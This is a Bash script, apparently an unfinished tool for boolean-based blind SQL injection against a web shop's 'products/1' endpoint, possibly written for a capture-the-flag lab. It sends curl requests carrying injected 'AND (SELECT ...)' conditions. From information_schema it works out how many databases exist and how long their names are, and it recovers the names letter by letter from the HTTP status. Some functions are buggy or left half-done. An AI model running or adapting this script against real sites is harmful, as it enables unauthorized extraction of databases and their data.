#!/bin/bash

declare -A object
MYSQL_STANDARD_DATABASES=('mysql','information_schema')

function enumarteViaNumber() {
	((index++))
  	[ $index -le 100 ]
}

function enumarteViaAlphabet() {
	aplphabet='abcdefghijklmnopqrstuvwxyz'
        ((y++))
	echo $aplphabet[0]
	index=$(echo $aplphabet[$y])
	echo "$index"
	echo $y
        [ $y -le 26 ]
}

function loopThrow() {
	START=1
	END=100
	placeholderSqli="$1"

	while "${object['condition']}"; do
		sqli="$(printf "${placeholderSqli}" "$index")"
		request "$sqli"
                result=$(echo $?)
                if [ $result -eq 0 ]; then
                        echo "$index "
                        break
                fi
	done
	index=0
	y=0
}


function getLength() {
	# store the length in array!
	# required: ??
	# parameter: ??
	# IT Create from three parameter the sqli!

	START_Y=1
	END_Y=$((object['amountOfDatabases']))
	results=''
	sqlQuery="$1"
	object['condition']='enumarteViaNumber'


	#object['condition']='enumarteViaAlphabet'

	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
		count=$((indey-1))
		sqli="AND (${sqlQuery} LIMIT 1 OFFSET $count) = %d"
		results+=$(loopThrow "$sqli")
	done
	echo $results
}

function encodeToUrl() {
	# it can make some problems! NOT SURE!
	# PROBLEMES can come from the quots
	#echo $(python -c `from urllib.parse import quote; print(quote(\"${1}\"));`)

	# will that solve our Problem?
	echo $(echo "$1" | /usr/bin/jq -Rr '@uri')
}

function getAmount() {
	#echo 'i get the amount of the tables/columns/content'
	# required:
	# - database
	# - sqli
	# parameter: ??

	sqlQuery=$1

	tableName='information_schema.tables'
	condition="table_schema = ${database}"

	for index in {1..6}; do
		sqli="AND (${sqlQuery}) = $index"
		request "$sqli"
		result=$(echo $?)
		if [ $result -eq 0 ]; then
			echo $index
			break
		fi
	done
}

function bruteForceName() {
	#  sqli="and (SELECT substr(LOWER(table_name), $index,1) FROM information_schema.tables WHERE table_schema = 'duckyinc' LIMIT 1 OFFSET $offset) = '$letter'"
	echo "i will get the name"
	# required:
	# - length
	# - count
	# - database/table/columns
	# sqli

	#1 many of databases = 5
	#-> loop 5 times
	#2 the length of the word 1 = 10
	# -> second loop
	# 3 inside the loop from 2 check if alphabet is equql

	sqlQuery=$1
	#SELECT substr(LOWER(DATABASE()), %d,1)
	placeholderSqli="AND (${sqlQuery}) = '%s'"

	length=$((object['amountOfDatabases']))

	#'SELECT substr(LOWER(DATABASE()), $index,1)
	list=()

	for (( index=0; index<=$length; index++ )); do
		#echo "###$index erster Loop###"
		name=''
		for (( i=1; i<=$index; i++ )); do
			#echo "#$i zweiter loop#"
			for letter in {a..z}; do
				#echo "$letter"
				#echo $index
				sqli="$(printf "${placeholderSqli}" "$i" "$letter")"
				#echo "${sqli}"
				#break
				request "${sqli}"
				result=$(echo $?)
                		echo $result
				if [ $result -eq 0 ]; then
                       			name="${name}${letter}"
					echo "$name"
                        		break
                		fi
			done
		done
		echo "$name"
		list+="${name}"
	done
}

function request() {
	#echo 'i will take care of the request and also the validation of the response'
	# rquired
	# - parsed url
	# take care of parsing url!
	SPACE="%20"
	encodedUrl=$(encodeToUrl "$1")
	#echo "$encodedUrl"
	#echo "$URL/${PATH}%20${encodedUrl}"
	/usr/bin/curl --silent -i "$URL/${PATH}${SPACE}${encodedUrl}" | /usr/bin/head -n 1 | /usr/bin/grep -q '200'
	#/usr/bin/curl --silent -i $URL/"${PATH}%20${encodedUrl}" | /usr/bin/head -n 1
}

#SQLiTablesCount="SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=${database}"
#SQLiColumnsCount="SELECT COUNT(*) FROM ${table}"
#SQLILength="SELECT LENGTH(<column>) FROM information_schema.<column> WHERE <table_schema> = <table_name>"

URL="http://${target}"
PATH="products/1"

# find all datbases that are not standad only the number!
# which are in mysql standard?
# mysql, information_schema

#amountOfDatabases=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
#echo "There are ${amountOfDatabases} in the server"
# es sind 5 databases drinne!
object['amountOfDatabases']='5'
#object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata')
getLength 'SELECT length(schema_name) FROM information_schema.schemata'

# get Database name
echo "${object['lengthOfDatabaseNames']}"
bruteForceName 'SELECT substr(LOWER(DATABASE()), %d,1)'
#bruteForceName '(SELECT substr(DATABASE(),1,1)) = '
